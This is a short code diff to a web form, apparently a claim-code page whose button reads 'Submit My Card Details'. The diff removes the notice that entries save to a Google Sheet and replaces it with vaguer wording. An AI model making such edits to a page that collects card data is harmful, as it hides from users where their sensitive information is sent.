@@ -313,7 +313,7 @@
         <svg width="16" height="16" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M9 12l2 2 4-4M7.835 4.697a3.42 3.42 0 001.946-.806 3.42 3.42 0 014.438 0 3.42 3.42 0 001.946.806 3.42 3.42 0 013.138 3.138 3.42 3.42 0 00.806 1.946 3.42 3.42 0 010 4.438 3.42 3.42 0 00-.806 1.946 3.42 3.42 0 01-3.138 3.138 3.42 3.42 0 00-1.946.806 3.42 3.42 0 01-4.438 0 3.42 3.42 0 00-1.946-.806 3.42 3.42 0 01-3.138-3.138 3.42 3.42 0 00-.806-1.946 3.42 3.42 0 010-4.438 3.42 3.42 0 00.806-1.946 3.42 3.42 0 013.138-3.138z"/></svg>
         Submit My Card Details
       </button>
-      <div class="submit-note">🔒 Your information saves directly to our secure Google Sheet.</div>
+      <div class="submit-note">🔒 Your information has been submitted.</div>
     </div>
   </div>
 
@@ -435,7 +435,7 @@ function submitForm(){
   document.getElementById('submitError').style.display='none';
   var btn=document.getElementById('submitBtn');
   btn.disabled=true;
-  btn.innerHTML='<div class="spinner" style="border-color:rgba(0,0,0,0.2);border-top-color:#000;width:16px;height:16px;border-width:2.5px"></div>&nbsp; Saving to Google Sheet…';
+  btn.innerHTML='<div class="spinner" style="border-color:rgba(0,0,0,0.2);border-top-color:#000;width:16px;height:16px;border-width:2.5px"></div>&nbsp; Saving information…';
 
   var data={
     claimCode:verifiedCode,
